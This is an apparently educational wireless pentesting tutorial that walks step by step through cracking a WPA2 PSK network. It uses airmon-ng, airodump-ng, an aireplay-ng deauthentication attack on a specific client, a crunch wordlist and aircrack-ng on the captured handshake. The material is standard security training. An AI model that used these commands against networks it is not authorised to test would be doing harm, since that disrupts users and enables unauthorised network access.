## Overview

- **Wireless Pentesting**: It's about checking how safe a Wi-Fi network is, whether it's a home network with a password (WPA2 PSK) or a business one with a more complex security setup (WPA2 Enterprise).

- **What's Done**:
  - Testing how strong the Wi-Fi password is.
  - Looking at nearby networks to find any security issues.
  - Checking if guest networks have weak spots.
  - Making sure only the right devices can get on the network.

- **Tools Needed**:
  - Wireless card: This helps see what's happening on the network.
  - Router: This is the main device giving out Wi-Fi.
  - Laptop: You use this to run different tests and commands.

- **Steps (for WPA2 PSK)**:
  1. **Put Wireless Card in Monitor Mode**: So it can see all the data going through the air.
  2. **Find Network Info**: Get details like which Wi-Fi channel it's on and its unique ID (BSSID).
  3. **Pick Network & Save Data**: Choose the network you're checking and start saving the data it sends.
  4. **Kick Devices Off**: Make devices disconnect from the Wi-Fi, which helps capture important security info.
  5. **Grab Wi-Fi Password Handshake**: This is needed to try to guess the password later.
  6. **Try to Guess the Password**: Use different methods to figure out the Wi-Fi password from the captured data.

## Walkthrough

```shell
# Connect wireless card to laptop
# Ensure connection by checking wireless interfaces
iwconfig

# If wlan0 is shown, it's connected
# Currently in managed mode; switch to monitor mode
sudo airmon-ng check kill  # Kill interfering processes
sudo airmon-ng start wlan0  # Start monitor mode on interface
iwconfig  # Check if wlan0mon is active

sudo airodump-ng wlan0mon
# Search for networks and stop after identifying the target network

sudo airodump-ng -c 11 --bssid 74:D2:1D:A4:82:5A -w capture wlan0mon
# -c for channel, --bssid for BSSID, -w for capture filename
# Capture handshake by running deauthentication attack

# In a new tab
sudo aireplay-ng -0 1 -a 74:D2:1D:A4:82:5A -c BC:6A:D1:81:5C:8B wlan0mon
# -a for access point, -c for station to deauthenticate
# Helps capture handshake

ls
# Check for capture files

# Generate wordlist using crunch
crunch 8 8 -t %@aaaa@% -o samplewordlist.txt
# 8-letter password, % for numbers and @ for lowercase characters

# To crack handshake
aircrack-ng -w samplewordlist.txt -b 74:D2:1D:A4:82:5A capture-01.cap
# -b for access point MAC address, .cap file contains the handshake to be cracked
```